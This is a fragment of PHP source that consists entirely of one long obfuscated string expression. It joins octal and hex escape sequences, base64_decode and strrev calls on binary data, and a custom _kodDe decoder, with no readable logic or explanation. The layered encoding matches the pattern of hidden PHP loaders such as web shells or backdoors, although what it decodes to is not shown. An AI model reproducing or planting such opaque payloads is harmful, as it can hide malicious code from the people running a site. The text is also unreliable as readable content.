70\365\207\153\136\72\167\316".base64_decode('G+uTf9vrAt/GMx5+65Zz9IGTf/LA1htfaDy1teHIhgd+V599N/LW9I6z3t/42Rn/yh84dNJb764/')."\162\375\21\117\37\176\243\313\121\32\276\345\234\216\347\102\305\360\52\171\354\364\267\67\235\172\370\173\253\126\114\233\367\277\7\337\365\366\103\253\352\16\377\142\50\166\203\362\122\303\61\251\103\376\364\362\306"."\xa7\x36\x3d\x95\xd8\xe7\xc5\x23\xe\x3b\xff\xd9\x7\x93\x2f\x77\x45\x9f\xd9\xfe\xee\xd6\xa1\x33\x7e\xf5\xe4\xf4\x57\xda\xaf\x2d\x74\x7e\xf9\xde\xe6\x2f\xef\xdd\xf3\xc3\x5d\x2f\xdd\xb2\xf5\xb6\xed\xd7\x9d\x70\xc3\x15\x85\x13\x67".base64_decode('3Lh68+yRcH+41XXUjemXLntNvvKpg0884vxbD5h39CUzXn89P1a+Jr+gfunL5SuO+GU4bEy0n7X4').base64_decode('sxubrz+9e9dnP33z8w3qn8OBcOjyR2b98/wnZl590mlLb71v1mlNV9x+SIPWcqa+YcFFozOu26Fv')."\257\171\353\207\37\76\273\162\145\370\263\245\373\355\177\333\314\135\102\351\364\233\23\353\347\357\352\332\326\172\346\157\36\135\271\145\305\346\306\73\313\211\273\3\77\76\354\273\167\137\261\352\373\247\167\204\167"."\x66\x1e\x3c\xea\xea\xd8\x39\xd3\x4f\x9e\x79\x56\xcb\x97\xcf\xcd\x6d\x7f\xa5\xf5\x89\x47\x1e\xde\x5c\x58\xb8\xd7\x60\xc3\xcb\xd7\xed\xf6\xc8\x6f\xc6\xfa\x6e\x79\xc0\x75\xca\xe4\x9e\xb3\xdb\x5e\x3e\xe5\x37\xef\x1d\xb2\x70\xcb\x9".base64_decode('16gvLz3gw6fe3HXfQx0dG3/Tf1Wbb9aeu6z58x/2u6l4U/zhwy7OJq/7o3ld78h+r/zP0y/c4Trx').strrev('ó‰s»n6ûÑ¥ËİèËüÉzŸ\'Âë³…MeÇi)é~s¸÷´¶Û_îGiîëü³äÌÖİ–')."\266\103\275\215\55\207\334\366\124\327\372\5\261\266\232\215\321\307\157\70\245\355\200\337\35\174\363\17\364\177\236\364\207\277\337\367\374\203\267\275\175\352\371\346\17\136\370\142\357\201\375\327\35\374\364\31\27".strrev('ÍgÛ¿Ær½®›Æ›ätxìnóœİwßá‘à|Ÿ«õCÀñ>Šo·şïV÷Ãzÿâéhâàòz z/¸').base64_decode('p38ofmf2yxc2rT+q92r5jO++2bvPP9KPvbFtnxX9zk++c+5Bf75kfeqEjwZ+fuijXYb3x3skf3vS')."\xbe\x27\xfd\xe9\xae\x4b\x8b\x4f\x8e\x2c\x8a\x15\x9f\xbe\x6c\xf2\xac\xbf\xde\xf2\x9d\x2f\xb7\xef\xf5\xab\x6b\x23\x7d\x9b\x67\xdc\xd1\xb6\xdf\xde\x37\xbf\x72\xe9\xf\xf6\xdf\xf3\xbe\x97\x96\xbd\x76\xfc\xcd\x93\x35\xdd\xde\x5f\x6c"."\x4b\x37\xbf\xfa\xeb\x3d\x9e\x57\xa6\x5d\xf3\xea\xd5\xfb\x1e\x3d\xe7\xf6\xa1\x43\xff\x32\xeb\xc9\x97\x4f\xde\xe5\xcd\x9b\xe\x2a\x77\x94\x97\xde\xff\xb\xcf\xf3\x33\xbe\x7f\xe0\xf7\x9a\x6f\x3d\xb7\xee\xa4\x97\x9e\xc9\x2d\x7f\xfc"."\217\75\43\201\275\217\37\131\172\367\51\355\137\355\343\331\245\153\257\135\122\327\66\47\113\73\356\176\104\372\375\161\317\164\175\156\66\317\76\357\250\271\361\47\266\373\163\127\355\267\136\36\132\160\101\152\367"."\103\127\266\375\344\47\7\364\117\113\75\66\263\171\217\47\367\161\357\125\33\272\343\330\227\332\316\272\366\243\362\316\137\274\366\176\361\345\273\36\372\331\153\37\233\353\257\155\37\251\271\74\47\215\36\274\171"."\327\213\352\156\336\162\145\352\346\243\375\367\216\264\37\77\174\300\263\227\175\161\350\312\371\117\174\134\376\237\147\217\155\255\15\225\352\256\250\253\163\145\315\203\127\157\177\76\377\367\57\167\275\247\316\321\62"."\355\205\245\312\226\330\41\33\132\337\276\121\11\150\315\227\235\376\110\127\126\131\371\300\123\165\17\254\274\351\225\256\53\57\220\266\274\172\330\276\153\17\275\171\144\366\320\317\256\353\275\176\345\125\335\67\277"."\xf1\xe3\xc4\xe5\xfd\x3f\xd7\xff\xd4\x55\x5b\x77\x59\x79\xf3\x8b\xa7\xbf\xff\xc0\x7d\xbb\xfe\xf9\x98\x96\x9c\xbc\x71\xdf\xbf\x36\x2f\xbe\xf9\x8b\x8e\x48\xe2\xeb\xb5\xc9\x97\xbe\xfe\xfa\xf2\x7f\x7e\xfe\xe2\xf4\x2f\x1f\x3a\xf3\x92"."\336\313\137\33\177\264\261\264\72\325\134\152\53\237\266\307\36\73\37\337\162\361\113\315\33\33\57\171\142\373\357\43\237\374\176\237\17\357\170\340\256\151\257\376\153\275\64\355\341\15\332\375\155\371\143\217\274"."\154\346\105\217\372\147\324\36\322\274\355\270\77\134\375\170\355\246\257\245\206\301\330\165\362\340\56\232\66\377\303\307\276\352\276\371\31\355\177\75\273\37\372\362\255\75\217\374\346\227\367\236\371\340\206\330\253".base64_decode('1x526JxXdrm77p999z32R2/rhk9KP1LHtO3GxsDa0Jq3P/lo9/1feCGy7of7HjD9yP/57b6l/V55')."\x68\x8f\xab\x4f\xbf\xfc\x7f\x76\x69\xf9\xf4\x9a\xa2\x73\xfe\xce\x7d\x83\x17\x7e\xf4\xe6\x65\x73\x34\xfd\x94\xa7\x87\x22\xfb\xf9\xc7\x7e\xd8\x66\x6e\x58\x35\x3a\xe7\xe9\x7d\x1f\x3b\xf0\x96\xb1\xc2\x67\x5f\xff\x69\x68\xe3\x85\x4f"."\xef\x7f\xeb\x8b\x2f\xce\x7d\x7d\xe5\x9a\x53\x1e\xff\xf5\x35\xb\x97\xff\x76\x5b\xf3\x59\x9f\x6e\x9f\xf9\xf4\xb\x2f\x6f\xdd\xf0\x87\xa3\x56\x7f\x78\xe4\xfd\x67\x7b\xdf\x3a\xc5\x7b\xc5\x86\x3\xef\x99\x2c\x7f\xf2\xf0\xa5\xf1\xbb"."\376\371\301\13\37\134\171\336\161\307\376\363\243\317\16\34\274\76\176\317\330\347\377\174\374\263\363\276\231\377\315\137\37\174\60\163\334\355\153\377\361\376\247\137\334\263\342\202\357\76\265\356\201\247\277\172\363".base64_decode('4RljH9TeMGff22eX1zx2ZOz5zlf6jvhRXU0y+dhb8rN7vbn7OVtr+iIbx+88aanadtQJR0/7S/q5')."\x83\x9a\xfd\xc3\x47\x5c\x73\xde\x65\xf7\xed\xb2\xd7\x1d\x8d\x3d\xa5\xf4\xfa\xab\x4e\x9\xe\x7\x1f\xdf\x7c\x6e\x2e\xf0\x64\xfc\x83\xbb\x7f\xbe\xe1\x9c\xc0\xef\x4f\x1e\xfd\xf3\xf1\x9f\xbf\xa4\xcd\xbe\xe3\xe6\xf7\x7d\xb5\x5b\x57"."\xaf\x8f\x9c\x5c\x77\xfa\x43\xa9\xe9\x27\xb4\xfe\xed\xcf\x4b\xd3\xe1\x47\x3e\x1a\x5f\xeb\x68\x4e\xfa\x7e\xb9\xfa\xf3\xfb\x7e\x71\xe0\x8f\xc3\x6f\xc\xf\x5c\xd4\xf9\xca\xda\xb1\xfc\xdb\x9f\x3c\xf4\x51\xe9\xf6\xdd\xce\xbd\x73\xb3"."\373\235\303\256\317\137\167\370\207\363\276\373\371\306\137\377\342\251\147\327\114\154\256\375\240\156\353\262\367\177\274\260\346\241\335\236\117\57\377\321\261\345\223\227\115\70\75\33\332\357\135\266\143\267\370\111\373"."\17\35\234\154\332\121\277\364\324\367\136\350\272\363\370\314\41\353\175\307\207\6\136\232\343\312\377\276\146\333\205\201\203\346\72\346\267\314\330\161\310\33\373\325\65\276\373\323\232\3\243\147\277\345\73\73\266"."\xdf\x1\xbf\x3e\x68\xf3\x59\xf7\x1c\xfc\xd3\x93\x2e\x79\x6b\xbe\x2f\x57\xb3\xf7\xc9\x49\xdf\xa7\x79\x47\x6e\xd3\x8f\xf3\xdd\xff\x3a\x69\xe6\xf4\xee\x65\x9b\x1f\x5d\x7f\xc9\xde\xb\xef\x1f\x5d\xf9\xc9\x8e\x95\x1b\xbe\xfa\xd7\xa2".strrev('²ûO&ãşÿ¯‡Öò~çé^{šãc±eìôİwßÔ\\Ş»øøa»tk‚ïqşC‘')."\x3f\xf3\xcd\x75\xd1\x1b\xba\x9f\xfb\xf4\x86\x3f\x5d\xfd\xf9\x85\x67\xbd\xda\x7a\xc6\xac\xc9\x8f\x8f\x2d\x3f\x77\xe1\x53\x7\x3e\xf7\x75\x21\x59\xb7\x70\x53\xfa\x4f\xf\x5c\xf4\xdc\x15\xa9\x8f\x3f\xce\x7f\xfc\xb7\x39\xaf\x7c\xbc".base64_decode('oWHZRdFbYgftjD7i3j508Aej5062nDCre/Mhv+rfdtlN903e92Dbljcdm18xj2q/6e1E/Mbz5q16')."\xb1\x71\x75\xe8\xfc\x4f\x37\xe5\xa6\xff\xee\x85\xa6\x8d\x87\xed\x35\xa7\xf3\xa6\x83\xa2\xc6\xa2\x3b\xee\xfd\x74\xcf\x13\xbf\x37\xdd\x71\x73\x69\x63\xfa\x91\x48\xec\xfe\xfd\x2e\xfa\x47\x79\xc5\x99\x5b\xef\xf9\x57\x8b\xeb\xa7\x3f"."\x3a\xb1\xd6\xff\x57\xa9\x4d\x5e\xbe\xff\x9d\x3f\xeb\xd8\xf3\x8a\xa3\x7f\x7b\xd8\xb5\x4d\xcf\x5f\x70\xe0\xf8\x79\x2f\xed\x38\x2b\x7b\x74\xf4\x96\x27\x5e\xfe\xd3\x6b\xde\x77\x76\xfb\xd1\x5\xd\xfa\x35\xd3\xce\x79\xea\xc6\x1b\x1b".strrev('v~—Çö=¤Ÿ·›ôÃ\\Õ¶·‡íMô²áüo‹ÂŞŸî‡%ï{WVœ.·Í€ûßß5µònr~}Æ¼?')."\330\63\332\335\107\175\322\365\374\111\363\377\376\344\243\373\157\237\74\362\262\320\337\156\175\260\165\377\256\107\272\167\74\333\262\155\157\343\226\113\36\70\356\324\276\131\327\154\270\377\204\63\346\235\275\150\317"."\7\112\205\175\232\372\367\370\345\367\272\37\335\160\346\17\142\27\277\65\161\324\103\327\156\171\246\74\134\377\112\364\334\277\15\175\366\335\73\237\135\171\306\362\303\376\171\354\171\27\137\374\341\351\207\367\74".strrev(' w»µ¯_ÖV»ëßqÿ»ƒô¾Ÿ™Âş¼o“Y×}~»fOŞxşK#ÌöÍO#c#WÕıœ·ƒ±÷5')."\155\317\337\264\177\272\117\344\334\53\73\313\347\315\276\354\363\366\226\267\246\173\207\36\333\267\77\164\327\17\146\216\354\270\146\257\143\277\336\43\263\375\362\127\267\137\232\177\267\353\21\305\177\217\173\375\345".strrev('ş{å¯7/-Èı¡´?6¯úõÄÿb½Î÷©ö?ßm]ËÃâ{=Ö_®ë·ÜgÛûÅv\\_}®ùv½¿.z‹')."\252\203\136\352\275\314\367\116\113\313\261\33\306\367\116\134\361\310\335\153\277\376\342\264\114\374\230\57\377\366\331\265\356\143\47\276\176\346\305\235\337\374\343\311\177\74\174\151\354\330\57\77\174\353\373\337\174".base64_decode('+bcHr9z59N17jZx97ZVPu7/5vO+vXzx5qSt+17Yv//f+z+Lf/OXLs89w3fP1qy/cs+hfHw9e+tnI').strrev('‹+âùß·—òvşk ç>¿\'Ñı¼×ç¶ã>‘~}¶Â±àú¼Ït©Ÿom‘éí¼)â{œû‹#ö')."\262\207\37\126\272\343\256\257\127\215\257\325\77\376\372\304\123\262\277\272\152\305\301\37\164\377\365\263\363\373\56\276\372\203\243\216\233\33\167\74\375\253\234\53\376\222\153\363\143\347\76\271\160\321\167\256\75"."\376\215\343\357\74\342\203\356\221\346\37\156\72\166\301\351\257\337\171\335\170\240\263\323\133\72\173\316\141\333\216\73\273\346\341\213\33\36\114\334\32\253\333\361\347\323\247\335\71\315\267\345\357\347\237\324\233"."\332\164\362\266\234\337\261\353\274\114\360\220\120\266\341\331\77\76\362\203\245\207\65\374\45\334\230\173\66\27\73\376\233\135\177\276\345\314\345\277\77\200\252\107\257\326\212\351\102\231\154\205\346\315\45\127\72"."\131\55\77\232\233\40\172\62\104\123\40\67\136\36\225\127\223\373\15\242\305\320\62\267\225\354\112\126\147\113\11\52\236\66\317\235\113\104\336\111\71\237\31\47\73\122\42\215\232\245\264\234\52\20\145\232\271".strrev('ÓMIšóÒ¤-yŸSNlºGrˆõI”MŸ<~‘MNUeÕ»S“)™¨Üµ2Bœœs1Å³\'Éó')."\205\244\274\232\174\140\76\371\302\274\46\222\271\271\171\36\331\175\347\112\131\335\50\120\11\232\144\326\23\143\231\211\34\351\244\24\150\325\152\172\143\76\257\231\64\65\237\320\262\112\216\174\276\251\225\24\127".base64_decode('zMmJ0WSJ9tHoRDZD9mHK5Kg2XiI3c1qiPDlO1ZLmzCN9oir65HiSXO2oidGiMknu1QrG5MTqPD3B')."\35\313\253\131\215\324\147\322\30\53\225\65\62\110\363\151\343\233\346\223\166\46\112\223\371\325\164\43\77\247\205\234\6\115\230\312\352\262\114\217\43\106\112\146\216\366\155\56\61\126\326\362\244\226\305\11\123"."\55\244\107\110\236\321\162\72\133\44\355\225\323\271\261\304\50\331\101\216\310\245\154\71\111\52\267\140\336\2\62\246\13\310\370\267\316\41\175\323\324\110\73\277\265\231\342\220\121\323\213\131\43\75\111\276\264"."\140\1\251\146\113\63\55\242\225\214\137\113\53\151\140\363\202\71\224\240\110\11\152\331\50\215\23\52\323\307\263\212\221\33\245\103\115\77\333\110\206\156\336\34\122\334\34\132\256\234\63\212\205\21\166\145\227"."\x9e\xd4\x72\xa4\xa8\xe6\x39\x24\x93\x32\x31\x56\x56\x47\xc8\xdd\xeb\x5c\x4a\x47\x72\x49\x9d\xcc\x51\x7d\xae\x5c\xc2\xd0\x8a\x2a\xbd\x91\x2d\x8e\x1a\x19\x93\x8c\x9f\xb1\x7a\xa4\x98\x1e\x27\xa3\xb4\x80\xce\x81\x79\x8d\x94\x2c\xe7"."\222\116\133\75\66\121\112\217\323\31\220\111\252\272\111\247\110\63\301\155\156\41\235\262\32\154\241\63\164\27\277\240\231\364\131\162\102\65\23\243\244\16\331\321\324\310\30\73\6\231\320\112\71\235\252\344\26"._kodDe('LsXUAanfQmQppGrApFiJ1brk4RUI9YvDpJA5mJwyyTEqM4t06lb+JKmWLtpAWVo/jY33QcCcataQNg==')."\150\321\244\163\263\172\311\240\224\337\102\73\127\53\115\144\307\51\125\314\151\44\144\224\52\27\22\306\30\201\266\54\40\270\171\75\221\35\113\117\222\376\234\107\312\235\120\322\252\101\47\135\162\164\262\74\61"."\106\116\321\133\50\112\171\114\317\117\26\115\132\311\271\224\214\151\5\11\235\25\24\171\44\77\111\356\102\312\332\210\71\272\232\320\302\34\202\221\52\310\43\372\50\231\40\232\232\312\53\245\61\112\44\120\133"."\x4f\x4e\x71\xcd\x3f\x78\x34\xc0\x8f\x40\xe2\x72\x9a\xe8\xa0\x6\x4\xd\xf4\x78\x46\x31\xe3\x44\xb7\x8c\x94\xda\xe5\x89\x4\xbc\xf1\x90\x87\xaa\x44\xc9\xc5\xa2\xbb\xb2\xf0\x64\x56\x49\x8e\xc6\xe5\x84\xa6\x9b\xf4\x0\xaa\x4\x35"."\xdd\xc8\x7c\x58\x49\xf9\x48\x97\x9c\x1c\xa5\x87\xd7\x86\x29\x9b\x25\xc3\x86\x40\x35\xfb\x93\xa2\xe6\xe7\xa8\xa2\x50\xf5\x45\xaa\x20\xc9\x2f\xa0\x8d\x12\x52\x47\xa6\xe9\xfc\xd8\x2\x36\x56\xb8\xa8\x86\xd1\x88\x88\x9b\x2c\x98\x42"."\62\210\131\122\241\102\41\74\135\341\61\172\15\20\61\65\235\135\335\143\15\33\27\254\241\313\332\240\306\46\13\106\52\141\111\147\120\172\46\143\117\111\333\341\11\324\165\114\177\1\376\107\47\72\262\15\61"."\224\325\45\205\251\70\143\154\27\355\257\204\320\357\370\134\336\224\215\121\227\10\166\212\251\152\1\174\72\227\163\131\155\206\240\1\11\35\246\70\327\113\345\55\344\367\246\2\214\367\261\320\25\326\101\23\364"."\323\212\51\215\101\123\164\221\304\115\44\263\47\77\1\243\102\330\326\142\27\257\131\35\14\326\127\353\161\241\126\244\255\156\330\126\67\52\120\150\247\230\206\153\301\23\155\143\50\66\51\303\316\261\371\241\52"."\251\40\257\35\271\263\250\350\110\64\364\126\352\264\20\205\225\256\311\351\46\262\366\161\110\370\203\16\11\335\42\112\126\113\224\200\117\142\327\255\342\310\213\225\324\25\40\116\44\131\5\213\23\122\132\6\131"._kodDe('L1xCCUH1O9l4OjA1lVGys8Q72lJKghvNujoL1xEB4N2iZk+FGCrairz8gppykXhNWvfNVAsmhj8AIw==').base64_decode('u57WlZRKtfKUPMKkmrDocoapAyZziqxbLobaFwF+B+37zIWLiLURufGKC98lYYE3CtCc/bKJTjCX')."\257\113\60\304\203\150\102\16\254\145\264\20\62\241\16\16\145\154\26\204\303\245\2\114\45\272\355\156\41\277\213\243\216\21\175\277\64\251\130\237\265\375\240\302\116\326\45\240\231\200\377\246\14\244\331\104\146".base64_decode('wRFkfATjojDvTZgdde63ZDXFphcBjy8wRSUjJ5eZMAQaU1DYOJQMrssp89kC1f/iyZxGuRMYv3hK').base64_decode('JYi9ga64L0CM2zyhQDwSCQqrWJvAOKAqPb/VhDGuUg/P9cUbT8MY06g8A03joHZkRCKmOWAIvT2e').base64_decode('MNOAnONqdDVxXPDBOFQE7aCmPJGoJ1zFTBKbT5L+JSaTJENPcFDyBnsH+voj2C4Qw/uDQjrSc7Mk')."\213\140\122\254\77\324\353\361\372\245\100\177\64\110\25\130\231\36\57\122\135\216\260\70\155\272\156\50\314\54\222\344\307\21\121\275\132\54\221\225\104\210\162\310\121\33\253\211\65\304\352\142\365\253\134\61\143".base64_decode('mMydVeKIELYe8pEWtbEQWwv6IpGjiPJ+MOzx9tJaAEGFBIPeAA7sPOfGd+742c6Ltm7fsAkUtOPC')."\23\166\234\167\353\73\267\155\172\367\304\273\266\157\75\175\347\335\77\333\161\316\365\73\116\77\236\124\375\335\353\177\367\316\135\367\354\74\347\252\355\133\317\337\261\371\366\235\27\236\204\23\336\273\372\306\355"."\33\257\142\25\223\336\73\373\356\35\77\333\262\343\334\33\166\154\332\272\375\216\263\267\157\73\141\373\155\267\71\100\356\367\116\336\264\363\256\255\73\116\335\274\343\227\77\335\361\333\323\166\134\274\151\373\306".base64_decode('y7dfcNXOn12//YoTt6/f9O715x5hpx0cH6KjQK6t3cfEjIY63LMxYzbs1XrwWwdVYcEv1QAEFBeB')."\x76\x2c\xfd\x5e\xbf\x5d\xb5\x5c\x8c\x12\x73\xd2\x6\x4c\x14\x90\xa6\x99\xb4\x60\x10\x73\x54\x1a\x8f\x23\x6b\x83\xda\x29\x6b\xb1\x96\xc\xbd\x50\x29\xa1\x32\x3e\x7f\xc4\x1b\xe\x74\xf9\x89\xb2\x25\x1b\xa8\x59\x48\xe9\x8f\xdc\x86"."\3\150\44\274\234\205\231\375\105\205\21\260\124\107\215\200\353\45\113\103\144\127\122\313\225\362\5\124\131\251\6\152\227\324\70\40\47\105\162\204\124\3\127\2\0\120\222\140\266\325\101\133\102\244\307\126\273"."\xb2\xd6\xd1\xe8\x68\xaa\x97\x88\x85\x30\xce\x41\x2c\x82\xa5\x1a\x62\xd\xcc\xf2\x59\x3e\xe2\x48\x58\x62\x4d\x8e\xc6\x7a\xa9\xa6\x38\x5a\x43\xea\xc5\xfb\x15\xd4\x3e\x8e\x31\xd\x49\x76\xd4\x91\xa\x8b\xd5\xe5\xb8\x80\xff\x19\xa6"._kodDe('KaAjyzWHi/sD7lektr+63iwu1y3lAfZBMOnnofDNjS0tIEl6vj0J8rYDIGJoibLfFUqhRgdAK2lcTQ==')."\x3a\xa3\x6e\x36\x61\x11\xa1\x25\x6c\xbc\xb1\x6\xaa\x84\xcd\x17\x70\xb5\x64\x83\xe\x14\x81\xa2\xa1\x82\x50\x3c\x5a\x14\x57\x3\xcd\x0\x83\x83\xf1\x41\x80\xa5\x8c\x2a\x13\xbc\x24\xc0\x89\x58\x2\x1d\x41\x8\x67\x83\x58\x25\xd".base64_decode('WW3XYDkGtzNvZCiXI2bDfStZGygtkyFQuM03NMTwR709mMojApmnErMshMq7U7KQSI6a9xE8PF0g')."\x43\x98\x86\xf0\x2\xfd\xdd\xc1\x70\x1f\x36\x40\x88\x78\x7b\xfc\x7d\x1e\x17\xe1\xdf\x98\x12\x30\x3e\x94\x17\xa4\xe\xa9\x16\x72\x3e\xc\xaa\xb5\x74\x3f\xfa\x10\xed\xb2\x28\xfa\x2a\x98\x57\x71\x53\x31\x4c\xdc\xb\xc5\xc\xa9\xc".strrev('±lrÓÂ)(Ï.lò$‹š	aƒÛ2õÒYË¨…'."\n".'Öëg°€:4pÁ2E$¹¶-GK(É˜Y	}')."\250\41\162\202\372\73\0\125\200\137\366\6\373\273\3\324\42\303\227\260\244\371\302\1\150\15\110\52\47\321\22\342\374\172\36\104\212\143\51\26\346\146\164\60\201\55\373\40\302\127\175\230\42\270\135\200\237".base64_decode('ifSzMBfaQARq0HEOPOhj4R5mTAUTgmEh4gl7+iIsGh4EHB3CBKOhPk8kClrVP9DHuX6vZzkgmCCX')."\113\50\307\256\163\65\54\252\217\141\223\10\34\304\77\213\151\14\252\225\17\257\151\162\110\163\327\325\23\34\152\104\20\67\263\140\313\36\347\137\71\252\67\336\33\134\202\343\310\35\204\277\220\342\162\265\64"."\44\1\271\63\312\345\116\203\56\137\154\106\110\200\216\45\154\147\45\365\7\7\75\334\267\200\220\200\41\104\262\225\270\307\1\367\61\103\261\261\230\13\210\14\306\52\156\351\340\353\222\250\60\342\205\247\16"."\x44\x5\x9f\xe4\xf6\xd0\x15\x95\x2e\x1d\xe\x12\x88\xe7\xb4\xc\xb5\x20\x6\x2c\x92\xa\x10\xf8\x77\x5\xd\x20\xee\x49\x32\x80\xed\x59\x31\x47\x2d\x1f\xb0\xc9\x45\x3c\xb6\x36\x76\x64\xcc\xe9\xc2\x56\x26\x50\x92\x89\x39\x78\xcd".strrev('eO'."\n".'7§à½ë][ø?mj?ëC`ìí	é;E=ü¤q<!&mJOkdq2&,DÕ`şâ')."\140\222\366\6\226\371\327\302\177\170\102\275\44\42\4\372\327\202\177\1\213\131\33\350\267\147\356\362\107\7\375\176\214\100\303\344\227\243\2\226\103\232\46\70\13\131\32\244\26\121\122\257\277\73\52\301\70"."\xfd\x6c\x3c\x5e\x87\x3a\xcf\x39\x3c\xbb\x3e\x1e\x77\x1b\x3\x84\x5a\x98\x45\x69\x5d\xed\xcc\xa6\x5a\xb2\x8a\x78\x22\x5e\xce\x7f\x2d\x74\x50\x49\x2\x48\x9f\xd8\x3a\xfe\xcc\xf9\x5\x89\x2f\x9\x7\x7\x42\x42\xbc\xc7\xb3\x3c\xd0"."\277\204\306\334\15\64\324\100\155\365\175\201\10\350\42\57\245\101\356\223\103\214\23\221\23\11\106\242\310\153\41\150\37\340\355\40\42\10\342\160\7\200\171\263\165\216\165\15\4\172\175\242\25\40\104\44\113"."\xa\xe2\xeb\x64\x55\x99\x45\x2b\x47\xe3\xc8\x1e\x90\x46\x60\x97\xd3\x30\x22\x2f\x1a\x41\x7d\x40\x23\xb8\x3\x68\xc\x75\x17\x8d\x20\xdf\x1f\x34\x82\x1a\x4a\x23\x70\x4b\xe2\xef\xa7\x69\x60\x8f\x7\xf6\x67\x74\xe3\x96\xe1\xea\xa8"."\131\271\314\254\133\26\246\22\202\341\252\355\124\11\235\230\370\341\270\221\105\2\351\164\111\202\361\34\74\236\22\16\71\334\30\3\110\233\10\7\374\306\126\55\102\322\360\52\112\226\330\140\313\214\252\46\63"."\xc0\x43\x1f\x25\x6e\x33\xc0\x47\x3\xc8\x5e\x46\xf8\x2c\x59\xcf\xf9\xa9\x8\x56\xf3\x8c\x6b\x82\x3a\x7b\x4\x81\xc8\x49\x19\x3f\x71\xb0\xee\x8e\x18\x97\x59\xc5\x36\x3d\xc4\x8\xd6\x41\x7e\x75\xde\x2c\xab\x9e\x1e\x84\x90\xb1\xde".base64_decode('B//ECG6M1IDYvdQ66FIc5yaUpl4SlEKRehrodA+3jmI6nCitlIDIYsejEx4wGNSQCckFpOqmJnEs').base64_decode('q+optaDE7lLsemUimKum8cNUql4NOtaSYUAwYpJT3HBHZqZHZpYbaYkuSnxdtAdKBTOi5MjVki+B')."\324\361\270\202\67\353\16\103\120\323\103\47\113\274\175\330\37\214\55\43\51\51\300\252\54\140\161\140\57\167\106\2\17\165\170\231\223\52\75\271\145\65\50\150\41\105\317\253\350\150\152\220\353\360\262\164\205"."\217\22\122\224\146\7\343\350\320\260\140\365\202\122\52\200\57\204\330\0\70\233\50\62\165\34\205\306\134\142\42\21\123\114\5\75\217\362\12\152\216\310\27\13\51\126\317\141\302\70\302\126\71\123\323\372\344"."\xc2\x44\x54\x5b\xae\x2a\x84\xd2\x7c\xc1\xc1\xfe\xde\x20\x75\xa0\x40\xbd\xad\x10\x1e\x41\x2e\x49\xc0\xe6\x43\x77\xd1\x88\x49\x3\xd5\x9b\xa4\xcb\xa4\x3e\x83\x74\x65\x41\x74\xca\x5d\x6c\x1d\x21\x92\x1\x1a\x4f\x4e\x50\x9e\xb0\xb7"."\7\210\202\361\356\0\220\223\375\53\210\270\265\54\350\213\107\202\3\141\172\162\1\343\310\350\41\354\367\256\144\47\11\14\332\355\131\156\207\300\342\242\236\45\125\301\114\20\204\160\304\163\343\341\40\224\232"."\375\275\335\266\14\221\36\346\253\302\12\213\367\6\372\227\125\115\210\6\343\175\102\26\14\4\173\347\76\73\314\132\102\304\17\273\202\307\273\172\203\136\41\71\20\254\354\11\300\350\155\100\54\126\323\305\270"."\x2e\xb6\x6\x71\xde\x36\xc0\x80\x53\x6b\xe1\xd2\xec\x8c\x83\x95\x7d\x51\x6c\x5d\x7d\x5d\xcc\xbd\xc8\xd5\xc0\xe4\x49\x3c\x34\x82\x8a\x7f\x75\xb0\x6a\x44\x2d\x6c\xcc\xed\x72\x91\x2\x58\x0\x48\xb3\xcc\x80\x98\xd2\x20\x71\x6\x14"."\xc1\x66\x97\x96\x2f\x10\x69\x60\x9d\xe0\x42\x3\x5a\x91\xb8\xec\x2e\x37\x2\xf8\x4c\x30\x1e\x59\x19\x61\x3d\x89\xd7\x80\x6a\xe9\x16\xda\xc1\x68\xe2\xa9\xb4\xd\x19\xfc\x85\x44\xd4\xa8\x92\x2f\x56\x45\xb4\x10\x9f\xc5\x8\x42\x4"."\271\124\215\367\20\136\224\104\253\53\214\304\61\326\250\132\33\235\211\311\22\264\375\344\375\315\147\61\0\271\70\273\42\45\361\215\17\231\303\116\321\261\22\354\165\221\363\246\22\266\251\107\0\374\362\117\230"."\240\34\330\114\257\307\126\72\363\316\124\54\272\4\172\250\210\35\315\52\250\352\202\213\210\244\126\110\41\257\30\124\25\40\111\231\154\11\154\33\351\1\62\134\177\14\347\230\112\273\140\46\63\55\45\127\63"."\x71\x19\x19\x46\xc7\xc5\x5b\xb5\xd5\x4e\x43\xcd\x14\x9c\x72\x2e\xa3\x1\x1e\x9c\xcd\x53\xa8\x3c\x6a\x49\xe7\xee\x45\x8a\x1a\xd8\x14\x53\xf\x79\x4e\xf0\x9\x21\xd\x23\x83\xc2\xe9\xd2\x2\x8f\xa8\x99\x57\x16\x18\x31\x58\x4c\xa4"."\34\330\247\354\336\201\333\327\11\253\111\4\125\271\115\152\45\236\213\272\301\72\47\250\174\7\113\146\0\272\244\341\166\126\220\115\42\147\75\144\55\227\270\247\63\52\75\127\347\354\160\253\54\350\260\123\6"."\221\37\345\7\357\371\121\166\314\116\227\171\132\365\262\322\55\334\146\361\75\64\161\102\6\322\272\46\350\5\21\321\70\357\232\200\72\361\25\313\37\64\207\22\75\263\171\6\43\255\316\236\76\217\327\11\330"."\x1c\xd3\x90\x58\x99\x7\xb4\xd3\xa3\x32\xca\x91\xc7\x8c\xd6\x38\xf4\x3c\xa0\x50\x41\x6d\xf6\x5c\x29\xb\xba\x9a\x90\x44\xa5\xdf\x96\x99\x56\xef\x40\x18\x88\xdd\x8a\x0\x99\x33\x5\xaf\x22\xe8\x20\x60\xa8\x8d\x54\x30\x90\xcb\x2d"."\70\216\315\325\351\205\126\126\146\25\206\315\300\241\152\337\135\121\365\273\53\252\175\167\205\355\273\53\52\277\213\101\66\222\224\213\105\57\366\106\46\62\16\13\50\51\106\50\7\116\303\313\26\361\302\206\110".strrev('!DÇÙh'."\n".'ƒğ–(L6NJÚˆ³!¶!w( ¬	.‰‡­şâ–˜Z}‘ˆx7Ãóeª}’Ü2ø×')."\122\266\133\63\214\52\272\14\0\52\141\307\235\45\314\204\44\44\202\52\320\351\242\152\110\162\242\240\351\171\72\66\304\141\22\363\175\303\74\343\160\367\71\170\37\210\303\176\146\122\331\47\217\173\62\112\104"."\x81\xbc\x8d\x74\x94\x7f\xbc\xa8\x19\x8a\xe8\x74\x29\xa5\x20\x67\x1e\xcc\xf0\x46\x1e\x87\x1c\x87\x5e\x5f\xca\xfa\x28\x4d\x19\x77\x82\x5a\xdb\xbc\xff\x18\x8a\x32\x4a\xa5\x46\x41\x38\x67\x2\x79\x88\x79\xf5\xb1\xd7\xd\xf6\xa0\x33"."\157\161\216\106\35\16\211\356\31\124\213\111\53\147\203\72\367\357\204\216\20\235\125\1\116\301\160\15\263\7\301\145\27\150\110\206\215\206\223\114\350\54\352\31\252\275\201\177\216\256\126\75\247\316\75\65\5"."\43\21\354\257\156\231\62\101\175\36\331\246\204\315\115\122\154\111